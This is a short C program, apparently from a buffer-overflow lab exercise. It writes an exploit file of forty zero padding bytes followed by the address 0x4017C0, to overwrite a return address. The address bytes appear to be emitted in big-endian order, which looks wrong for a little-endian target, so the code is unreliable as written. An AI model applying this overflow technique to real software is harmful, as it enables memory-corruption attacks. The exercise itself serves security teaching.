#include <stdio.h>

int main() {
    char str[] = "00000000004017C0";
    char *cur = str;
    int size = sizeof(str) - 1;
    FILE *fp = fopen("exploit.txt", "w");
    for (int i = 0; i < 40; i++) {
        fprintf(fp, "00 ");
    }
    for (int i = 0; i < size; i = i + 2) {
        fprintf(fp, "%c%c ", *(cur), *(cur + 1));
        cur = cur + 2;
    }
    return 0;
}
